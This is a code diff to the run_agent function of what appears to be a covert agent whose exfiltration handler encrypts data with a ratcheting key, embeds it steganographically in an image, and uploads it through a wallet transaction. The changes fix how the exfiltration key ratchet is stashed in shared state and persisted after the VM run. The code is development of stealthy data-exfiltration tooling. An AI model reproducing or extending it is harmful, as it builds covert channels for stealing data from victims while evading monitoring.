@@ -164,9 +164,6 @@ def run_agent(args):
 
     #Exfiltration handler closure with access to agent keys and state
     def exfil_handler(vm, data):
-        # advance for next exfil in same VM run
-        nonlocal K_exfil_ratchet  
-
         #Check for a saved cover image
         logger.info("Exfil handler start")
 
@@ -183,9 +180,6 @@ def run_agent(args):
         #Encrypt the exfil data
         logger.info("Exfil handler step B, exfil data encryption start")
         exfil_payload, new_exfil_ratchet = encrypt_task(data, K_exfil_ratchet)
-
-        #advance for next exfil in same VM run
-        K_exfil_ratchet = new_exfil_ratchet 
 
         logger.info("Exfil handler step B, exfil data encryption finished")
 
@@ -215,7 +209,10 @@ def run_agent(args):
             agent_wallet = load_wallet(args.wallet)
             txid = upload_image(agent_wallet, exfil_stego_path)
 
-       
+        #Stash the advanced exfil ratchet for post-VM persistence (first exfil only)
+        if "new_exfil_ratchet" not in shared_state:
+            shared_state["new_exfil_ratchet"] = new_exfil_ratchet
+
         logger.info("Exfil handler step C, exfil data uploading finished")
 
         return txid
@@ -312,9 +309,10 @@ def run_agent(args):
     logger.info(f"Step D, Bytecode execution result: is_halted={vm_result['is_halted']}, instruction_pointer={vm_result['instruction_pointer']}")
     logger.info("Step D, Bytecode execution finished")
 
-    #Advance and persist ratchet
+    #Advance and persist ratchet (K_exfil_ratchet only advances if an exfil occurred)
     logger.info("Step E, Advance and persist ratchet start")
-    agent_save_agent_keys(args.keyfile, agent_new_ratchet, K_exfil_ratchet, K_extract,
+    final_exfil_ratchet = shared_state.get("new_exfil_ratchet", K_exfil_ratchet)
+    agent_save_agent_keys(args.keyfile, agent_new_ratchet, final_exfil_ratchet, K_extract,
                           last_seen_txid=last_seen_txid, cover_path=stego_path)
     logger.info("Step E, Advance and persist ratchet Finished")
 
